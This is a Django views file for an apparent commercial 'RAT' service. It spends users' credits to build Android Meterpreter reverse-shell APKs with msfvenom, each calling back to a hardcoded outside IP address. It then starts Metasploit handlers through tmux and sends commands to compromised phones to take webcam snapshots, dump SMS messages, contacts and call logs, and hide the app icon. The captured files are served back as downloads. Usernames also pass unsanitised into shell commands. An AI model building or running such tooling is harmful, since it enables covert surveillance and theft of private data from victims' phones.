from django.shortcuts import render, redirect,get_object_or_404
from RAT import models
from django.http import HttpResponse, HttpResponseRedirect
from django.views import generic
from django.template import loader
import os, errno
from django.contrib.auth import login, authenticate
from django.contrib.auth.mixins import LoginRequiredMixin
from django.urls import reverse_lazy,reverse
from RAT.forms import SignUpForm
import subprocess
import gmplot
from django.http import JsonResponse



###################                  metasploit
def add(request):
    credits = models.Credit.objects.get(user = request.user)
    if credits.number > 0:
        credits.number-=1
        credits.save()
        host='185.120.221.217'
        port=4444+int(request.user.id)
        username = request.user.username
        dircd = '/root/django/users/'+ str(username)
        dir = '/root/django/users/'+ str(username)+'/'+str(username)
        d=os.system('mkdir /root/django/users/'+ str(username))
        c=os.system('cd '+str(dircd)+' ;msfvenom -p android/meterpreter/reverse_tcp lhost='+str(host)+' lport='+str(port)+' -o '+ str(dir)+'.apk')
        if c == 0:
            c = "Your rat created in "+ str(dir)+".apk"
    else:
        c = 'you dont have credit'
    # Render the HTML template index.html with the data in the context variable
    return render(
        request,
        'addrat.html',
        context={'c' : c
        },
    )

def listen(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'+str(username)
    dirr = '/root/django/users/'+ str(username)+'/'
    d=os.system('mkdir /root/django/users/'+ str(username))
    commandd = "tmux new-session -s "+str(username)
    os.system('xterm -T "'+str(username)+'" -e '+str(commandd))
    file =os.system('tmux capture-pane -t '+str(username)+' -pS -1000000 > '+str(dirr)+'file.txt""\n"')
    with open(dirr+'file.txt', 'rb') as fh:
        last = fh.readlines()[-1].decode()
    with open('hacked.txt', 'rb') as fh:
        hacked = fh.readlines()[-1].decode()
    if hacked == last :
        color = "green"
    else:
        color = "gray"
    return render(
        request,
        'listen.html',
        context={'last' : last,'hacked' : hacked,'color' : color,
        }
    )
def startlisten(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'+str(username)
    port=4444+int(request.user.id)
    os.system('tmux send-keys -t '+str(username)+' "msfconsole""\n"')
    os.system('tmux send-keys -t '+str(username)+' "use exploit/multi/handler""\n"')
    os.system('tmux send-keys -t '+str(username)+' "set payload android/meterpreter/reverse_tcp""\n"')
    os.system('tmux send-keys -t '+str(username)+' "set ExitOnSession true""\n"')
    os.system('tmux send-keys -t '+str(username)+' "set lhost 185.120.221.217""\n"')
    os.system('tmux send-keys -t '+str(username)+' "set lport '+str(port)+'""\n"')
    os.system('tmux send-keys -t '+str(username)+' "exploit""\n"')



    return redirect('RAT:msf/android/listen')

def webcamsnap(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/webcamsnap1.jpeg'

    os.system('tmux send-keys -t '+str(username)+' "webcam_snap -i 1 -o '+str(dir)+'""\n"')

##down
    username = request.user.username
    file_path = dir
    if os.path.exists(file_path):
        with open(file_path, 'rb') as fh:
            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
            return response



    return redirect('RAT:msf/android/listen')

def webcamsnap2(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/webcamsnap2.jpg'

    os.system('tmux send-keys -t '+str(username)+' "webcam_snap -i 2 -o '+str(dir)+'""\n"')

##down
    username = request.user.username
    file_path = dir
    if os.path.exists(file_path):
        with open(file_path, 'rb') as fh:
            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
            return response



    return redirect('RAT:msf/android/listen')


def dumpsms(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpsms.txt'

    os.system('tmux send-keys -t '+str(username)+' "dump_sms -o '+str(dir)+'""\n"')

##down
    username = request.user.username
    file_path = dir
    if os.path.exists(file_path):
        with open(file_path, 'rb') as fh:
            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
            return response

    return redirect('RAT:msf/android/listen')

def dumpcontacts(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpcontacts.txt'

    os.system('tmux send-keys -t '+str(username)+' "dump_contacts -o '+str(dir)+'""\n"')
##down
    username = request.user.username
    file_path = dir
    if os.path.exists(file_path):
        with open(file_path, 'rb') as fh:
            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
            return response

    return redirect('RAT:msf/android/listen')

def dumpcalllog(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpcalllog.txt'

    os.system('tmux send-keys -t '+str(username)+' "dump_calllog -o '+str(dir)+'""\n"')
##down
    username = request.user.username
    file_path = dir
    if os.path.exists(file_path):
        with open(file_path, 'rb') as fh:
            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
            return response

    return redirect('RAT:msf/android/listen')

def hideappicon(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpcalllog.txt'

    os.system('tmux send-keys -t '+str(username)+' "hide_app_icon""\n"')

    return redirect('RAT:msf/android/listen')

def geolocate(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'
    l1 = "34.0778838"
    l2 = "49.71006839999999"
    # gmap1 = gmplot.GoogleMapPlotter(l1,
    #                             l2, 13 )
    # gmap1.draw( str(dir)+"map.html" )
    return redirect('RAT:msf/android/listen')
